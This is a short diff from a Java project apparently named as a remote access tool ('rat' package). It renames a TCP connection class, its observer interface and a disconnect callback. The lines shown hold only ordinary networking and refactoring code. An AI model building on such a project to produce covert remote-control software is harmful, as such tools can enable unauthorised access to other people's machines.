@@ -8,21 +8,21 @@ import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.PacketType;
 
 
-public final class ActiveClient extends TCPConnection {
+public final class ActiveConnection extends TCPConnection {
 	
 	private LinkedBlockingQueue<IPacket> packetQueue;
 	
 	private Thread sender, reader;
 	
-	private IClientObserver observer;
+	private IConnectionObserver observer;
 	
-	public ActiveClient(final String address, final int port) {
+	public ActiveConnection(final String address, final int port) {
 		super(address, port);
 		
 		packetQueue = new LinkedBlockingQueue<IPacket>();
 	}
 	
-	public ActiveClient(final Socket socket) {
+	public ActiveConnection(final Socket socket) {
 		super(socket);
 		
 		packetQueue = new LinkedBlockingQueue<IPacket>();
@@ -87,7 +87,7 @@ public final class ActiveClient extends TCPConnection {
 		}
 		
 		if (observer != null) {
-			observer.clientDisconnected(this);
+			observer.disconnected(this);
 		}
 	}
 	
@@ -131,7 +131,7 @@ public final class ActiveClient extends TCPConnection {
 		packetQueue.remove(packet);
 	}
 	
-	public void setObserver(final IClientObserver observer) {
+	public void setObserver(final IConnectionObserver observer) {
 		this.observer = observer;
 	}
 	
